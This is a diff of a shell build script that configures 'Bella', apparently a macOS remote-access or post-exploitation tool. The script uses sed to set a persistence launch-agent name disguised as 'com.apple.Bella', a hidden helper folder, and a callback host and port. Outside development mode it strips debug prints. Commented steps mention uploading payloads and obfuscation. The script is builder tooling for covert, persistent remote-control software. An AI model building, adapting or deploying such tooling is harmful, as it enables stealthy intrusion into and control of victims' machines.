@@ -6,8 +6,8 @@ fi
 bella=$1
 bellaNoExt=${bella%.*}
 BuildsPath=Builds/$(date '+%m-%d@%H_%M')
-export C_INCLUDE_PATH=/System/Library/Frameworks/Python.framework/Headers
 mkdir -p $BuildsPath
+development=true
 cp $bella $BuildsPath/bella.py
 #cp Payloads/INSTALLER $BuildsPath/INSTALLER
 
@@ -30,15 +30,26 @@ if [[ -z "$port" ]]; then
 fi
 
 echo -e '\033[92mConfiguring your Bella installation\033[0m'
-sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
-sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
-sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py
-sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
-#sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
-#sed -i '' -e "s@LAUNCHAGENTNAME=NONE@LAUNCHAGENTNAME=$launchagent@" $BuildsPath/INSTALLER
-#sed -i '' -e "s@HELPERLOCATION=NONE@HELPERLOCATION=$helperLoc@" $BuildsPath/INSTALLER
-#sed -i '' -e "s@#Framework. This will be modified with the build. DO NOT USE THIS.@@" $BuildsPath/INSTALLER
-sed -i '' -e "s@development = True@development = False@" $BuildsPath/bella.py
+if [[ `uname` == 'Darwin' ]]; then #macOS
+	sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
+	sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
+	sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py
+	sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
+	if [ "$development" != "true" ]; then
+		sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
+		sed -i '' -e "s@development = True@development = False@" $BuildsPath/bella.py
+	fi
+else   #LINUX
+	sed -i "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
+	sed -i "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
+	sed -i "s@4545@$port@" $BuildsPath/bella.py
+	sed -i "s@127.0.0.1@$host@" $BuildsPath/bella.py
+	if [ "$development" != "true" ]; then
+		sed -i "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
+		sed -i "s@development = True@development = False@" $BuildsPath/bella.py
+	fi
+fi
+
 
 if [ $? -eq 0 ]
 then
@@ -48,35 +59,12 @@ else
 	exit 1
 fi
 
-#read -p "Do you want to convert Bella to a C binary? It will take a while to convert, and you will need to have Cython installed. [Y for a compiled C binary, N to keep Bella in Python] " -n 1
-#if [[ ! $REPLY =~ [Yy]$ ]]
-#then
 echo -e '\033[92mPreparing Python code.\033[0m'
-#python -m py_compile $BuildsPath/bella.py
 mv $BuildsPath/bella.py $BuildsPath/$bellaNoExt
 echo -e '\033[94mDone!\033[0m'
-#else
-#	printf '\n\033[92mConverting Python ['$bella'] to C code ['$bellaNoExt'.c]\033[0m\n'
-#	cython -2 --embed -o $BuildsPath/$bellaNoExt.c $BuildsPath/bella.py #input bella.py , out bella.c
-#
-#	if [ $? -eq 0 ]
-#	then
-#		echo -e '\033[93mConverted! Compiling. This may take a while.\033[0m'
-#	else
-#		echo -e '\033[91mError converting to C code!\033[0m'
-#		exit 1
-#	fi
-#	gcc -Os -o $BuildsPath/$bellaNoExt $BuildsPath/$bellaNoExt.c -lpython2.7 -lpthread -lm -lutil -ldl
-#	echo ''
-#	if [ $? -eq 0 ]
-#	then
-#		echo -e '\033[94mDone!\033[0m'
-#	else
-#		echo -e '\033[91mError compiling C code!\033[0m'
-#		exit 1
-#	fi
-	#mv $BuildsPath/$bellaNoExt.c $BuildsPath/server.c
-#fi
+
+
+#### The below is for automation of uploading to a server, and /or obfuscation. uncomment if you like.#####
 #compiled. now upload bella and payloads.
 #payloads_path=Payloads/payloads.txt
 #read -p "Do you want to generate your own payloads, or use the pregenerated ones? [Y to build your own, N to use pregenerated] " -n 1
